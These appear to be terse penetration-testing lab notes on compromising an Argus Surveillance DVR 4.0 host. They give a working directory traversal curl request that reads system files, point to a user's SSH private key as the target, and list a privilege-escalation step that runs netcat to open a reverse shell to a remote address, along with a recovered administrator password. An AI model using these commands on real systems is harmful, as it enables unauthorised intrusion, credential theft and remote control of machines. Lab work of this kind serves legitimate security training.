_____

>[!INFO]
> IP=192.168.229.179


# Argus Surveillance DVR 4.0.0.0 - Directory Traversal
https://www.exploit-db.com/exploits/45296


```bash
curl "http://$IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

```

![Captura](../../../../assets/images/reference/96ca1aa49ab0fb863efa.png)

C:/Users/viewer/.ssh/id_rsa


# PrivEsc

# Argus Surveillance DVR 4.0 - Weak Password Encryption

https://www.exploit-db.com/exploits/50130

```cmd
runas /user:administrator "nc.exe -e cmd.exe 192.168.45.160 443"
```
`14WatchD0g$`
